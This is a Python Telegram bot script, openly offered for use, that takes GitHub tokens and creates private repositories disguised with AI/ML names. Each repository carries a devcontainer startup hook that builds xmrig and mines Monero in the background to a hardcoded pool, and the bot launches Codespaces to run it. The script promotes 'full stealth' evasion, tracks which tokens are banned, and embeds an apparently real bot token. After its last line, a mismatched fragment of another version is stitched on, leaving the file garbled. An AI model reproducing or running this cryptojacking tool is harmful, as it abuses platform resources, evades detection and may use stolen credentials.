import os, telebot, random, string, requests, time
from github import Github
from threading import Thread

BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"
OWNER_ID = 8179218740  # Replace with your Telegram user ID
POOL = "185.84.98.85:5555"
WALLET = ""
TOKENS = []

bot = telebot.TeleBot(BOT_TOKEN)

def random_repo_name():
    return random.choice(["torch-core", "brainnet", "neural-gen", "mlkernel", "aithread", "vis-core"]) + "-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))

def create_repo_and_codespace(token, wallet):
    g = Github(token)
    try:
        user = g.get_user()
        username = user.login
        bot.send_message(OWNER_ID, f"😈 Logged in as {username}. Preparing mining repo...")

        for _ in range(2):
            repo_name = random_repo_name()
            repo = user.create_repo(repo_name, private=True, auto_init=False)
            files = {
                ".devcontainer/devcontainer.json": '''
{
  "name": "python runner",
  "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
  "features": {
    "ghcr.io/devcontainers/features/sshd:1": {
      "version": "latest"
    }
  },
  "postStartCommand": "chmod +x vjoj6e.sh && ./vjoj6e.sh"
}
''',
                "vjoj6e.sh": f'''
#!/bin/bash
sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# Remove old xmrig if exists
rm -rf xmrig

# Clone and build
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make -j$(nproc)

# Start mining in background
nohup ./xmrig -o {POOL} -u {wallet} -p aiworker --coin monero -a rx/0 > miner.log 2>&1 &
''',
                "README.md": "# AI Kernel Mining"
            }
            for path, content in files.items():
                repo.create_file(path, "init", content, branch="main")

            api = f"https://api.github.com/user/codespaces"
            headers = {
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github+json"
            }
            r = requests.post(api, headers=headers, json={
                "repository_id": repo.id,
                "machine": "basicLinux32gb",
                "location": "WestUs2",
                "idle_timeout_minutes": 120
            })
            if r.status_code != 201:
                raise Exception(f"Codespace creation failed for repo `{repo_name}`")

        bot.send_message(OWNER_ID, "✅ Codespaces started and mining configured 🧠💰")
    except Exception as e:
        bot.send_message(OWNER_ID, f"⚠️ Mining failed.\n🛠️ Error: {str(e)}")

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, """
🤖 *Welcome to the XMR Codespace Miner Bot* 🔥

💼 This bot lets you mine Monero (XMR) using GitHub Codespaces with full stealth mode.

👣 *Commands you can use:*
• `/wallet <your_xmr_wallet>` – Set your Monero wallet address
• `/token <github_token>` – Start mining with GitHub token
• `/check` – See which tokens are live or banned

💰 Profit is auto-mined directly to your wallet.
🔐 No mining logs, fully stealth in AI/ML-looking repos.

Let's get mining... 🚀
""", parse_mode="Markdown")

@bot.message_handler(commands=['wallet'])
def set_wallet(message):
    global WALLET
    try:
        WALLET = message.text.split()[1]
        bot.reply_to(message, f"✅ Wallet set to `{WALLET}`", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Usage: /wallet <your_monero_wallet>")

@bot.message_handler(commands=['token'])
def add_token(message):
    global WALLET
    try:
        token = message.text.split()[1]
        if not WALLET:
            bot.reply_to(message, "⚠️ Set wallet first using /wallet <address>")
            return
        TOKENS.append(token)
        Thread(target=create_repo_and_codespace, args=(token, WALLET)).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Invalid token or error occurred.\n{e}")

@bot.message_handler(commands=['check'])
def check_tokens(message):
    msg = "🧪 Token Check Results:\n"
    for token in TOKENS:
        try:
            g = Github(token)
            user = g.get_user()
            msg += f"✅ {user.login}\n"
        except:
            msg += f"❌ Invalid or banned token\n"
    bot.reply_to(message, msg)

bot.polling()parse_mode="MarkdownV2")

            except Exception as e:
                err = escape_markdown(str(e), version=2)
                bot.send_message(m.chat.id, f"❌ Repo error:\n`{err}`", parse_mode="MarkdownV2")

    except Exception as e:
        error_msg = escape_markdown(str(e), version=2)
        bot.reply_to(m, f"❌ Invalid token:\n`{error_msg}`", parse_mode="MarkdownV2")

@bot.message_handler(commands=['check'])
def check_tokens(message):
    msg = "🧪 Token Check Results:\n"
    for token in TOKENS:
        try:
            g = Github(token)
            user = g.get_user()
            msg += f"✅ {user.login}\n"
        except:
            msg += f"❌ Invalid or banned token\n"
    bot.reply_to(message, msg)

bot.polling()

